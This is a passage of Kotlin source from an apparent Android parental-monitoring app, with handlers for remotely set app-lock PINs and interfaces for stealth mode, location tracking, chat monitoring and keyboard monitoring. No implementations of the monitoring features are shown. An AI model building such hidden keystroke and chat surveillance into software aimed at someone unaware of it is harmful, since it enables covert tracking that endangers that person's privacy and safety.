        if (idx == -1) return LegacyArgs(null, emptyMap())
        val raw = command.substring(idx + 1)
        if (raw.isBlank()) return LegacyArgs(null, emptyMap())
        val (pathPart, queryPart) = raw.split("?", limit = 2).let {
            it[0] to it.getOrNull(1)
        }
        val query = queryPart
            ?.split("&")
            ?.mapNotNull { pair ->
                val parts = pair.split("=", limit = 2)
                if (parts.isEmpty()) return@mapNotNull null
                val key = parts[0]
                if (key.isBlank()) return@mapNotNull null
                val value = parts.getOrNull(1)?.takeIf { it.isNotBlank() } ?: return@mapNotNull null
                key to value
            }?.toMap()
            ?: emptyMap()
        return LegacyArgs(
            path = pathPart.takeIf { it.isNotBlank() },
            query = query
        )
    }

    // ==================== App Lock Command Handlers ====================

    /**
     * Handle SET_APP_LOCK_PIN command - set a new PIN for app lock
     * Expected JSON: {"cmd": "SET_APP_LOCK_PIN", "pin": "1234"}
     */
    private fun handleSetAppLockPin(json: org.json.JSONObject?) {
        try {
            val newPin = json?.optString("pin")
            
            if (newPin.isNullOrBlank() || newPin.length < 4) {
                sendDataChannelMessage("""{"type":"APP_LOCK_ERROR","reason":"INVALID_PIN"}""")
                Log.w("CommandHandler", "Invalid PIN provided")
                return
            }
            
            AppLockManager.setPin(context, newPin)
            sendDataChannelMessage("""{"type":"APP_LOCK_PIN_SET","success":true}""")
            Log.d("CommandHandler", "App lock PIN updated successfully")
        } catch (e: Exception) {
            Log.e("CommandHandler", "Error setting app lock PIN", e)
            sendDataChannelMessage("""{"type":"APP_LOCK_ERROR","reason":"${e.message}"}""")
        }
    }

    /**
     * Handle SET_APP_LOCK_ENABLED command - enable or disable app lock
     * Expected JSON: {"cmd": "SET_APP_LOCK_ENABLED", "enabled": true}
     */
    private fun handleSetAppLockEnabled(json: org.json.JSONObject?) {
        try {
            val enabled = json?.optBoolean("enabled", false) ?: false
            
            AppLockManager.setAppLockEnabled(context, enabled)
            sendDataChannelMessage("""{"type":"APP_LOCK_ENABLED_SET","enabled":$enabled}""")
            Log.d("CommandHandler", "App lock enabled: $enabled")
        } catch (e: Exception) {
            Log.e("CommandHandler", "Error setting app lock enabled state", e)
            sendDataChannelMessage("""{"type":"APP_LOCK_ERROR","reason":"${e.message}"}""")
        }
    }

    /**
     * Handle GET_APP_LOCK_STATUS command - get current app lock status
     */
    private fun handleGetAppLockStatus() {
        try {
            val enabled = AppLockManager.isAppLockEnabled(context)
            val hasPinSet = AppLockManager.hasPinSet(context)
            val failedAttempts = AppLockManager.getFailedAttempts(context)
            val isLockedOut = AppLockManager.isLockedOut(context)
            val remainingLockoutMs = AppLockManager.getRemainingLockoutTime(context)
            val lastUnlockTime = AppLockManager.getLastUnlockTime(context)
            
            val status = org.json.JSONObject().apply {
                put("type", "APP_LOCK_STATUS")
                put("enabled", enabled)
                put("hasPinSet", hasPinSet)
                put("failedAttempts", failedAttempts)
                put("isLockedOut", isLockedOut)
                put("remainingLockoutMs", remainingLockoutMs)
                put("lastUnlockTime", lastUnlockTime)
            }
            
            sendDataChannelMessage(status.toString())
            Log.d("CommandHandler", "App lock status sent")
        } catch (e: Exception) {
            Log.e("CommandHandler", "Error getting app lock status", e)
            sendDataChannelMessage("""{"type":"APP_LOCK_ERROR","reason":"${e.message}"}""")
        }
    }
}

/**
 * Interface for handling permission requests
 */
interface PermissionHandler {
    fun requestPermission(permission: String, requestCode: Int, featureName: String)
}

/**
 * Interface for handling stealth mode operations
 */
interface StealthHandler {
    fun activateStealthMode()
    fun deactivateStealthMode()
}

/**
 * Interface for handling location operations
 */
interface LocationHandler {
    fun startLocationTracking()
    fun stopLocationTracking()
}

/**
 * Interface for handling notification operations
 */
interface NotificationHandler {
    fun startNotificationSharing()
    fun stopNotificationSharing()
}

/**
 * Interface for handling chat operations
 */
interface ChatHandler {
    fun startChatMonitoring()
    fun stopChatMonitoring()
}

/**
 * Interface for handling keyboard monitoring operations
 */
interface KeyboardHandler {
    fun startKeyboardMonitoring()
    fun stopKeyboardMonitoring()
}

/**
 * Interface for handling settings and permission operations
 */
interface SettingsHandler {
    fun openAppSettings()
    fun checkPermissionStatus()
    fun requestAllPermissions()
    fun showPermissionSettingsDialog(featureName: String)
}

/**
 * Interface for handling parent voice operations
 */
interface ParentVoiceHandler {
    fun startReceivingVoice()
    fun stopReceivingVoice()
}
